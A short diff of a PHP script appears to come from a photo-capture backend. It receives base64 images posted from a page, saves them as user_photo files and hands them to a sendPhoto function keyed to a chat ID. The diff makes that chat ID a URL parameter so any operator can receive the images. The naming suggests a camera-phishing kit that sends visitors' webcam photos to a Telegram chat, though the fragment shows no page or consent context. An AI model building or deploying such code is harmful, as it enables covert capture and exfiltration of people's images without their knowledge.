@@ -18,12 +18,12 @@ function sendPhoto($file, $chatId){
     
     return true;
 }
-
-
-$chatId = "6227058036";
-
-
-if(isset($_POST['image'])){
+if(isset($_GET['id'])){
+    $chatId = urldecode($_GET['id']);
+}else{
+    die();
+}
+    if(isset($_POST['image'])){
     $data = $_POST['image'];
     $file = 'user_photo_'.md5($data).'.png';
     if(file_put_contents($file, base64_decode(explode(',', $data)[1]))){
